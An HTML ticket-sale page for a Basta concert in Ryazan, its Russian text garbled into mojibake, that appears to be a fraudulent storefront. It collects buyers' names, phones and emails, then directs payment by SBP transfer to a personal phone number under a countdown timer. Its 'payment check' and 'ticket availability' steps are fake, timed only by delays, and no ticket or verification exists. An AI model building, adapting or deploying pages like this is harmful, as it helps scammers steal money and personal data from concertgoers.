<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ë–∞—Å—Ç–∞ –≤ –†—è–∑–∞–Ω–∏ ‚Äî –ë–∏–ª–µ—Ç—ã</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --accent: #ff3b30;
            --bg: #000;
            --card: #1c1c1e;
            --text: #ffffff;
            --gray: #8e8e93;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Inter', sans-serif; 
            background-color: var(--bg); 
            color: var(--text);
            overflow-x: hidden;
        }

        /* –ó–∞–¥–Ω–∏–π —Ñ–æ–Ω —Å —Ñ–æ—Ç–æ */
        .hero-bg {
            position: fixed; top: 0; left: 0; width: 100%; height: 100vh;
            background: linear-gradient(to bottom, rgba(0,0,0,0.5), rgba(0,0,0,1)), 
                        url('https://avatars.mds.yandex.net/get-afisha/1675123/214777926b4742e947f6396e47f9e831/origin');
            background-size: cover; background-position: center;
            z-index: -1; filter: brightness(0.6);
        }

        .container { max-width: 500px; margin: 0 auto; padding: 20px; min-height: 100vh; }

        /* –®–∞–ø–∫–∞ */
        .top-badge { color: var(--accent); font-weight: 800; font-size: 12px; text-transform: uppercase; margin-bottom: 20px; letter-spacing: 1px; }
        .main-info h1 { font-size: 42px; font-weight: 800; line-height: 1.1; margin-bottom: 10px; }
        .event-details { font-size: 14px; color: var(--gray); margin-bottom: 30px; line-height: 1.5; }
        .event-details b { color: #fff; }

        /* –°—Ö–µ–º–∞ –∑–∞–ª–∞ */
        .stadium-map {
            background: rgba(255,255,255,0.05); border-radius: 20px; padding: 15px; margin-bottom: 30px;
            border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px);
        }
        .stadium-map img { width: 100%; border-radius: 10px; filter: invert(1); opacity: 0.8; }
        .map-label { text-align: center; font-size: 11px; color: var(--gray); margin-top: 8px; text-transform: uppercase; }

        /* –í—ã–±–æ—Ä –±–∏–ª–µ—Ç–æ–≤ */
        .ticket-item {
            background: var(--card); border-radius: 16px; padding: 20px; margin-bottom: 12px;
            display: flex; justify-content: space-between; align-items: center;
            border: 1px solid transparent; transition: 0.3s;
        }
                .ticket-item:hover { border-color: #444; }
        .t-name { font-weight: 600; font-size: 17px; }
        .t-price { color: var(--gray); font-size: 14px; margin-top: 4px; }
        
        /* –°—á–µ—Ç—á–∏–∫ –±–∏–ª–µ—Ç–æ–≤ */
        .counter { display: flex; align-items: center; gap: 15px; }
        .btn-count { 
            width: 32px; height: 32px; border-radius: 50%; border: 1px solid #444;
            background: none; color: white; cursor: pointer; font-size: 18px; display: flex; align-items: center; justify-content: center;
        }
        .count-val { font-weight: 600; min-width: 20px; text-align: center; }

        /* –ò—Ç–æ–≥–æ–≤–∞—è –∫–Ω–æ–ø–∫–∞ */
        .bottom-bar {
            position: sticky; bottom: 20px; background: #fff; color: #000;
            padding: 20px; border-radius: 18px; display: flex; justify-content: space-between;
            align-items: center; cursor: pointer; margin-top: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        .bottom-bar span { font-weight: 800; font-size: 18px; }

        /* –§–æ—Ä–º–∞ –¥–∞–Ω–Ω—ã—Ö */
        .form-group { margin-top: 20px; }
        input {
            width: 100%; padding: 18px; border-radius: 14px; border: 1px solid #333;
            background: #111; color: #fff; margin-bottom: 12px; font-size: 16px; outline: none;
        }
        input:focus { border-color: var(--accent); }

        /* –û–ø–ª–∞—Ç–∞ */
        .pay-card { background: #fff; color: #000; padding: 25px; border-radius: 20px; margin-top: 20px; }
        .pay-card p { font-size: 13px; color: #666; margin-bottom: 4px; }
        .pay-card b { font-size: 20px; display: block; margin-bottom: 15px; }
        .no-link { color: inherit !important; text-decoration: none !important; }
        .timer { font-size: 28px; font-weight: 800; color: var(--accent); margin: 20px 0; text-align: center; }

        /* –õ–æ–∞–¥–µ—Ä */
        .loader { display: none; text-align: center; padding: 50px 0; }
        .spinner {
            width: 40px; height: 40px; border: 3px solid #333; border-top: 3px solid var(--accent);
            border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .hidden { display: none; }
        .btn-main { background: #fff; color: #000; border: none; padding: 18px; border-radius: 14px; width: 100%; font-weight: 700; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>

<div class="hero-bg"></div>

<div class="container">
    <!-- –®–∞–≥ 1: –í—ã–±–æ—Ä –±–∏–ª–µ—Ç–æ–≤ -->
    <div id="step1">
        <div class="top-badge">–†—è–∑–∞–Ω—å –ê—Ñ–∏—à–∞</div>
        <div class="main-info">
            <h1>–ë–∞—Å—Ç–∞</h1>
            <div class="event-details">
                <b>23 –º–∞—è, 19:00</b><br>
                –î–° ¬´–û–ª–∏–º–ø–∏–π—Å–∫–∏–π¬ª<br>
                –†—è–∑–∞–Ω—å, —É–ª. –ó—É–±–∫–æ–≤–æ–π, 12–∫2
            </div>
        </div>

        <div class="stadium-map">
            <!-- –°—Ç–∏–ª–∏–∑–æ–≤–∞–Ω–Ω–∞—è —Å—Ö–µ–º–∞ –∑–∞–ª–∞ -->
            <img src="https://avatars.mds.yandex.net/get-afisha/411440/e33682948f95c024564c7f0709b30c04/origin" alt="–°—Ö–µ–º–∞ –∑–∞–ª–∞">
            <div class="map-label">–í—ã–±–µ—Ä–∏—Ç–µ —Å–µ–∫—Ç–æ—Ä –∏ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –±–∏–ª–µ—Ç–æ–≤</div>
        </div>

        <div id="tickets">
            <div class="ticket-item">
                <div class="t-left">
                    <div class="t-name">–¢–∞–Ω—Ü–ø–æ–ª</div>
                    <div class="t-price">2 500 ‚ÇΩ</div>
                </div>
                <div class="counter">
                    <button class="btn-count" onclick="changeCount('t1', -1)">‚Äì</button>
                    <div class="count-val" id="t1">0</div>
                    <button class="btn-count" onclick="changeCount('t1', 1)">+</button>
                </div>
            </div>

            <div class="ticket-item">
                <div class="t-left">
                    <div class="t-name">–§–∞–Ω-–∑–æ–Ω–∞</div>
                    <div class="t-price">4 500 ‚ÇΩ</div>
                </div>
                <div class="counter">
                    <button class="btn-count" onclick="changeCount('t2', -1)">‚Äì</button>
                    <div class="count-val" id="t2">0</div>
                    <button class="btn-count" onclick="changeCount('t2', 1)">+</button>
                </div>
            </div>

            <div class="ticket-item">
                <div class="t-left">
                    <div class="t-name">–°–µ–∫—Ç–æ—Ä VIP</div>
                    <div class="t-price">8 000 ‚ÇΩ</div>
                </div>
                <div class="counter">
                    <button class="btn-count" onclick="changeCount('t3', -1)">‚Äì</button>
                    <div class="count-val" id="t3">0</div>
                    <button class="btn-count" onclick="changeCount('t3', 1)">+</button>
                </div>
            </div>
        </div>

        <div class="bottom-bar" id="checkoutBtn" onclick="goToStep2()" style="display: none;">
            <div>–ë–∏–ª–µ—Ç–æ–≤: <span id="totalCount">0</span></div>
            <div>–ö –æ–ø–ª–∞—Ç–µ: <span id="totalPrice">0 ‚ÇΩ</span></div>
        </div>
    </div>

    <!-- –®–∞–≥ 2: –î–∞–Ω–Ω—ã–µ -->
    <div id="step2" class="hidden">
        <h2 style="margin-bottom: 20px;">–í–∞—à–∏ –¥–∞–Ω–Ω—ã–µ</h2>
        <div class="form-group">
            <input type="text" id="fio" placeholder="–§–ò–û –ø–æ–ª–Ω–æ—Å—Ç—å—é">
            <input type="tel" id="phone" placeholder="+7 (___) ___-__-__">
            <input type="email" id="email" placeholder="E-mail –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –±–∏–ª–µ—Ç–∞">
            <button class="btn-main" onclick="goToStep3()">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
        </div>
    </div>

    <!-- –®–∞–≥ 3: –û–ø–ª–∞—Ç–∞ -->
    <div id="step3" class="hidden">
        <h2 style="text-align: center;">–û–ø–ª–∞—Ç–∞ –°–ë–ü</h2>
        <div class="timer" id="timer">05:00</div>
        
        <div class="pay-card">
            <p>–°—É–º–º–∞ –ø–µ—Ä–µ–≤–æ–¥–∞:</p>
            <b id="finalAmount" style="font-size: 26px; border-bottom: 1px solid #eee; padding-bottom: 10px;">0 ‚ÇΩ</b>
            
            <p style="margin-top: 10px;">–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (–°–ë–ü):</p>
            <b class="no-link">+7 (929) 942 81 07</b>
            
            <p>–ë–∞–Ω–∫:</p>
            <b>–ö–ë –°–æ–ª–∏–¥–∞—Ä–Ω–æ—Å—Ç—å</b>
        </div>
        
        <button class="btn-main" style="margin-top: 20px; background: var(--accent); color: #fff;" onclick="verify()">–Ø –æ–ø–ª–∞—Ç–∏–ª(–∞)</button>
    </div>

    <!-- –§–∏–Ω–∞–ª -->
    <div id="stepFinal" class="hidden" style="text-align: center; margin-top: 40px; background: rgba(0,0,0,0.8); padding: 30px; border-radius: 20px;">
        <div style="font-size: 50px; margin-bottom: 20px;">üì®</div>
        <h2>–ó–∞—è–≤–∫–∞ –ø—Ä–∏–Ω—è—Ç–∞</h2>
        <p style="color: var(--gray); margin-top: 15px;">
            –û–∂–∏–¥–∞–π—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –æ–ø–ª–∞—Ç—ã –º–æ–¥–µ—Ä–∞—Ç–æ—Ä–æ–º. –ë–∏–ª–µ—Ç—ã –∏ —á–µ–∫ –±—É–¥—É—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω—É—é –ø–æ—á—Ç—É –≤ —Ç–µ—á–µ–Ω–∏–µ 24 —á–∞—Å–æ–≤.
        </p>
    </div>

    <!-- –ó–∞–≥—Ä—É–∑–∫–∞ -->
    <div id="loader" class="loader">
        <div class="spinner"></div>
        <p id="loaderText" style="color: var(--gray); font-size: 14px;"></p>
    </div>
</div>

<script>
    const prices = { t1: 2500, t2: 4500, t3: 8000 };
    let counts = { t1: 0, t2: 0, t3: 0 };

    function changeCount(id, delta) {
        counts[id] = Math.max(0, counts[id] + delta);
        document.getElementById(id).innerText = counts[id];
        updateTotal();
    }

    function updateTotal() {
        let total = (counts.t1 * prices.t1) + (counts.t2 * prices.t2) + (counts.t3 * prices.t3);
        let count = counts.t1 + counts.t2 + counts.t3;
        const btn = document.getElementById('checkoutBtn');
        if (count > 0) {
            btn.style.display = 'flex';
            document.getElementById('totalCount').innerText = count;
            document.getElementById('totalPrice').innerText = total.toLocaleString() + ' ‚ÇΩ';
        } else {
            btn.style.display = 'none';
        }
    }

    function showLoader(time, text, nextId) {
        document.querySelectorAll('.container > div:not(#loader)').forEach(d => d.classList.add('hidden'));
        const l = document.getElementById('loader');
        l.style.display = 'block';
        document.getElementById('loaderText').innerText = text;
        setTimeout(() => {
            l.style.display = 'none';
            document.getElementById(nextId).classList.remove('hidden');
        }, time);
    }

    function goToStep2() {
        showLoader(4000, "–ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏ –±–∏–ª–µ—Ç–æ–≤...", "step2");
    }

    function goToStep3() {
        const f = document.getElementById('fio').value;
        const p = document.getElementById('phone').value;
        const e = document.getElementById('email').value;
        if(f.length < 5 || p.length < 5 || !e.includes('@')) { alert('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –¥–∞–Ω–Ω—ã–µ'); return; }

        showLoader(4000, "–ü–æ–∏—Å–∫ —Å–≤–æ–±–æ–¥–Ω—ã—Ö —Ä–µ–∫–≤–∏–∑–∏—Ç–æ–≤...", "step3");
        document.getElementById('finalAmount').innerText = document.getElementById('totalPrice').innerText;
        startTimer(300);
    }

    function verify() {
        showLoader(20000, "–°–∏—Å—Ç–µ–º–∞ –∏—â–µ—Ç –æ–ø–ª–∞—Ç—É...", "stepFinal");
    }

    function startTimer(duration) {
        let timer = duration, min, sec;
        setInterval(() => {
            min = parseInt(timer / 60, 10);
            sec = parseInt(timer % 60, 10);
            document.getElementById('timer').innerText = (min < 10 ? "0"+min : min) + ":" + (sec < 10 ? "0"+sec : sec);
            if (--timer < 0) timer = 0;
        }, 1000);
    }
</script>

</body>
</html>
